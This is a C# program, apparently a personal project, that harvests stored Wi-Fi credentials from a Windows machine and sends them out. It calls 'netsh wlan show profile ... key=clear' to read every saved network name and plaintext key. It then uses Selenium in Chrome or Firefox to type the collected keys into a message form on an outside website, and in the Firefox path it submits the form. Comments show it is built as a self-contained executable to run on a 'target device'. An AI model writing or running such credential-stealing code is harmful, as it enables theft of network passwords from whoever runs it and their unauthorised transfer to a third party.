using System;
using System.Collections.Generic;
using System.Management.Automation;
//using WindowsInput;
//using System.Windows.Input;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Edge;
using OpenQA.Selenium.Firefox;
using System.Diagnostics;
using Microsoft.WindowsAPICodePack.Net;

// https://github.com/PowerShell/PowerShell/issues/7909
// dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true

namespace Remote_Key_Web_Based_Extraction
{
    class Remote_Key_Web_Based_Extraction
    {
        private static List<string> user_profiles_list = new List<string>();

        static void Main(string[] args)
        {
            Remote_Key_Web_Based_Extraction main_program = new Remote_Key_Web_Based_Extraction();
            user_profiles_list = main_program.user_profiles_scan();
            string key_contents = main_program.local_key_content_extraction(user_profiles_list);
            Console.WriteLine(key_contents);
            main_program.web_content_key_extraction(key_contents);
        }
        public List<string> user_profiles_scan()
        {
            List<string> temp_user_profiles_list = new List<string>();

            PowerShell ps = PowerShell.Create();
            ps.AddCommand("netsh")
                .AddParameter("wlan show", "profiles");
            var results = ps.Invoke();

            foreach (var item in results)
            {
                if (item.ToString().Contains("All User Profile"))
                {
                    string user_profile_name = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
                    Console.WriteLine("[+] " + user_profile_name);
                    temp_user_profiles_list.Add(user_profile_name);
                }
            }
            return temp_user_profiles_list;
        }

        public string local_key_content_extraction(List<string> user_profiles_list)
        {
            string key_set = "";
            for (int i = 0; i <= user_profiles_list.Count - 1; i++)
            {
                PowerShell ps = PowerShell.Create();
                ps.AddCommand("netsh")
                    .AddParameter("wlan show profile " + user_profiles_list[i], "key=clear");
                var results = ps.Invoke();

                foreach (var item in results)
                {
                    if (item.ToString().Contains("Key Content"))
                    {
                        string key = item.ToString().Substring(item.ToString().IndexOf(":") + 2, item.ToString().Length - (item.ToString().IndexOf(":") + 2));
                        key_set += user_profiles_list[i] + ":" + key + "|";
                        break;
                    }
                }
            }
            return key_set;
        }

        public void web_content_key_extraction(string key_contents)
        {
        /*

        // System.Diagnostics.Process.Start(string fileName, string arguments);

        //https://stackoverflow.com/questions/49529559/cant-open-link-in-c-sharp
        System.Diagnostics.Process.Start("cmd", "/c start https://anthony-t-n.github.io");

        // https://stackoverflow.com/questions/25987445/installed-inputsimulator-via-nuget-no-members-accessible
        InputSimulator s = new InputSimulator();

        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.F5);
        // 22 tab presses
        for (int i = 0; i <= 22; i++)
        {
            s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.TAB);
        }
        s.Keyboard.KeyPress(WindowsInput.Native.VirtualKeyCode.VK_4);
        s.Keyboard.TextEntry(key_content);
        */

        // Issues with Selenium. Requires driver executables on target device.
        // https://stackoverflow.com/questions/57762289/why-is-chromedriver-working-in-debug-mode-but-not-on-release
            /*
            
            EdgeOptions edgeOptions = new EdgeOptions();
            var current_drver = new EdgeDriver();
            OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
            var options = new EdgeOptions();
            options.UseInPrivateBrowsing = true;
            var current_driver = new EdgeDriver(options);
             
            */
            try
            {
                // https://stackoverflow.com/questions/45130993/how-to-start-chromedriver-in-headless-mode
                //var chromeOptions = new ChromeOptions();
                //chromeOptions.AddArguments("headless");
                Console.WriteLine("[=] Attempting to try Chrome");
                OpenQA.Selenium.IWebDriver current_driver = new OpenQA.Selenium.Chrome.ChromeDriver();
                current_driver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                current_driver.FindElement(By.Name("message")).SendKeys(key_contents);
                //current_driver.FindElement(By.Name("send")).Click();
                //current_driver.Quit();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.WriteLine("[=] Attempting to try FireFox");
                OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver();
                current_drver.Navigate().GoToUrl("https://anthony-t-n.github.io/");
                current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_contents);
                current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                current_drver.Quit();
            }
            finally
            {
                Console.WriteLine("[+] Successfully extracted content key from local device");
            }
        }
    }
}
